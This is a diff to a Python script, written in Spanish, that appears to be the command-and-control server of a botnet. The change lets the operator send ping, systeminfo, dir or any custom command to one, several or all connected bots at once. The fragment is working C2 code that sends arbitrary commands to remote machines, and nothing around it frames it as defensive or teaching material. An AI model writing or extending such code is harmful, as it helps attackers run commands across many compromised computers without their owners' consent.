@@ -80,32 +80,56 @@ def dar_ordenes():
         print("No hay bots conectados.")
         return
 
-    listar_bots()
-    bot_id = int(input("Seleccione el ID del bot al que quiere dar órdenes: "))
-    bot = next((b for b in bots if bot_ids[b] == bot_id), None)
-    if not bot:
-        print("ID de bot no válido.")
-        return
-
     print("\nÓrdenes disponibles:")
     print("1. Hacer PING a una dirección específica")
     print("2. Comando personalizado")
     print("3. Obtener información del sistema")
     print("4. Listar archivos en el directorio actual")
+    print("5. Enviar orden a todos los bots")
     orden = input("Seleccione una orden: ")
 
     if orden == "1":
         direccion = input("Ingrese la dirección a hacer PING: ")
-        bot.send(f"ping {direccion}".encode('utf-8'))
+        comando = f"ping {direccion}"
     elif orden == "2":
         comando = input("Ingrese el comando personalizado: ")
-        bot.send(comando.encode('utf-8'))
     elif orden == "3":
-        bot.send("systeminfo".encode('utf-8'))
+        comando = "systeminfo"
     elif orden == "4":
-        bot.send("dir".encode('utf-8'))
+        comando = "dir"
+    elif orden == "5":
+        comando = input("Ingrese el comando para todos los bots: ")
+        for bot in bots:
+            try:
+                bot.send(comando.encode('utf-8'))
+            except Exception as e:
+                print(f"Error al enviar orden a {bot.getpeername()}: {e}")
+        return
     else:
         print("Orden no válida.")
+        return
+
+    print("\nSeleccione los bots a los que quiere dar órdenes (separados por comas) o 'todos' para todos los bots:")
+    listar_bots()
+    seleccion = input("Ingrese su selección: ")
+
+    if seleccion.lower() == "todos":
+        for bot in bots:
+            try:
+                bot.send(comando.encode('utf-8'))
+            except Exception as e:
+                print(f"Error al enviar orden a {bot.getpeername()}: {e}")
+    else:
+        bot_ids_seleccionados = [int(id.strip()) for id in seleccion.split(",")]
+        for bot_id in bot_ids_seleccionados:
+            bot = next((b for b in bots if bot_ids[b] == bot_id), None)
+            if bot:
+                try:
+                    bot.send(comando.encode('utf-8'))
+                except Exception as e:
+                    print(f"Error al enviar orden a {bot.getpeername()}: {e}")
+            else:
+                print(f"ID de bot {bot_id} no válido.")
 
 def cerrar_conexion_bots():
     if not bots:
